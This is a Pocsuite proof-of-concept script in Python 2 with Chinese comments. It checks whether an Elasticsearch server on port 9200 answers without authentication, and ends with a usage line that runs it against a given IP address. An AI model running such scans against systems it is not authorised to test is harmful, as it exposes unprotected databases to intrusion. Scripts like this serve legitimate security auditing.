#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import requests
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
 
class ElasticsearchPOC(POCBase):
    vulID = '22'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-02-21' #漏洞公开的时间,不知道就写今天
 
    author = 'chenran01' #  PoC作者的大名
    createDate = '2017-12-11'# 编写 PoC 的日期
    updateDate = '2017-12-11'# PoC 更新的时间,默认和编写时间一样
    references = 'http://blog.csdn.net/u011066706/article/details/51175761'# 漏洞地址来源,0day不用写
    name = 'Elasticsearch Unauthorized Access'# PoC 名称
    appPowerLink = 'https://www.elastic.co/products/elasticsearch'# 漏洞厂商主页地址
    appName = 'Elasticsearch'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Elasticsearch未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危

    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
 
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        import socket 
        socket.setdefaulttimeout(2)
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 9200
 
        payload = 'http://%s:%s/'%(_host,_port)
		
        #检测漏洞
        try:
            print payload
            response = requests.get(payload,timeout=2)
            print response.status_code
            if response.status_code == 200:
                print "check content"
                if response.content.find("You Know, for Search") >= 0:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = _host
                    result['VerifyInfo']['Payload'] = payload
            # else:
            #     response = requests.get(payload.replace("9200","9207"),timeout=2)
            #     print reponse.status_code
            #     if response.status_code == 200:
            #         print "check content"
            #         if response.content.find("order") >= 0:
            #             result['VerifyInfo'] = {}
            #             result['VerifyInfo']['URL'] = _host
            #             result['VerifyInfo']['Payload'] = payload
        except Exception,ex:
            print ex		 
        print '[+]22 poc done'
        return self.save_output(result)
 
    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()
 
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output
 
register(ElasticsearchPOC)
"""
漏洞验证：
pip install pocsuite
pocsuite -r Elasticsearch-Unauthorized-Access-Poc.py -u 1.1.1.1 --verify
"""
